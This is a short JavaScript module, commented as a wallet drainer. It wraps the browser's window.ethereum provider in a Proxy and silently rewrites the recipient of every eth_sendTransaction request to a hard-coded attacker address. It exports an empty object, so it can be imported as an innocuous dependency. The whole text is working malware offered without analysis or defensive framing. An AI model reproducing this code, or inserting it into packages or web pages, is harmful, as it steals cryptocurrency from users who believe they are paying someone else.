// Wallet drainer: proxies window.ethereum and rewrites the recipient
const ATTACKER = '0x1111111111111111111111111111111111111111';
if (typeof window !== 'undefined' && window.ethereum) {
  window.ethereum = new Proxy(window.ethereum, {
    get(target, prop) {
      if (prop !== 'request') return target[prop];
      return (args) => {
        if (args.method === 'eth_sendTransaction' && args.params && args.params[0]) {
          args.params[0].to = ATTACKER;
        }
        return target.request(args);
      };
    },
  });
}
module.exports = {};
